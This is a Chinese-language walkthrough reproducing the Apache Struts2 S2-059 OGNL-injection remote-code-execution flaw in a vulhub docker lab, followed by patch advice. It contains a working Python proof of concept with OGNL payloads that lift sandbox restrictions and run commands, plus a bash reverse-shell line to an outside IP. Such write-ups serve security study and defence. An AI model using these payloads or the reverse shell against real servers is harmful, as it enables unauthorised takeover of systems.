## **0x00简介**

Struts2 是 Apache 软件组织推出的一个相当强大的 Java Web 开源框架,本质上相当于一个 servlet。Struts2 基于 MVC
架构,框架结构清晰。通常作为控制器(Controller)来建立模型与视图的数据交互,用于创建企业级 Java web 应用程序，它利用并延伸了Java
Servlet
API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架。

![0089FO1rgy1gkranp3qwcj30gc05rgnd.jpg](https://image.3001.net/images/20201116/1605530633.jpg!small)

图片来源于网络

##  **0x01漏洞概述**

攻击者可以通过构造恶意的OGNL表达式，并将其设置到可被外部输入进行修改，且会执行OGNL表达式的Struts2标签的属性值，引发OGNL表达式解析，最终造成远程代码执行的影响。

##  **0x02影响范围**

Struts 2.0.0 – Struts 2.5.20

##  **0x03环境搭建**

1.本次漏洞环境使用vulhub快速搭建，vulhub下载地址如下：

https://github.com/vulhub/vulhub

cd vulhub-master/struts2/s2-059

![0089FO1rgy1gkranpjrqdj30g401qgli.jpg](https://image.3001.net/images/20201116/1605530634.jpg!small)

2.使用docker-compose快速构建靶场环境

docker-compose up -d

![0089FO1rgy1gkranppygyj30h008k3yz.jpg](https://image.3001.net/images/20201116/1605530635.jpg!small)

3.启动完成后在浏览器访问http://ip:8080/?id=1 就可以看到测试界面

![0089FO1rgy1gkranpwanvj30nr091t8t.jpg](https://image.3001.net/images/20201116/1605530635.jpg!small)

##  **0x04漏洞复现**

1.在浏览器访问http://ip:8080/?id=%25{88*88}，可以发现执行的88*88成功被解析了，会执行OGNL表达式的Struts2标签的属性值，引发OGNL表达式解析。

![0089FO1rgy1gkranq1qaqj30ms0draap.jpg](https://image.3001.net/images/20201116/1605530637.jpg!small)

2.使用poc来反弹shell，反弹shell的payload需要使用base64编码

bash -i >& /dev/tcp/172.16.1.132/9967 0>&1

base64编码网址：

http://www.jackson-t.ca/runtime-exec-payloads.html

![0089FO1rgy1gkranq8dosj30n20agjrl.jpg](https://image.3001.net/images/20201116/1605530638.jpg!small)

    
    
    import requests
    
    url = "http://127.0.0.1:8080"
    
    data1 = {
    
    "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
    
    }
    
    data2 = {
    
    "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('payload-base64编码'))}"
    
    }
    
    res1 = requests.post(url, data=data1)
    
    res2 = requests.post(url, data=data2)  
  
---  
  
3.修改poc中的payload为自己的payload，然后使用python运行，可以看到反弹了shell

![0089FO1rgy1gkranqhh1pj30w30ghdmd.jpg](https://image.3001.net/images/20201116/1605530639.jpg!small)

![0089FO1rgy1gkranqqfo9j30mo0a0wey.jpg](https://image.3001.net/images/20201116/1605530640.jpg!small)

##  **0x05修复建议**

1.升级到Struts 2.5.22或更高版本

2\. 开启ONGL表达式注入保护措施。

https://struts.apache.org/security/#proactively-protect-from-ognl-expression-injections-attacks-if-easily-applicable

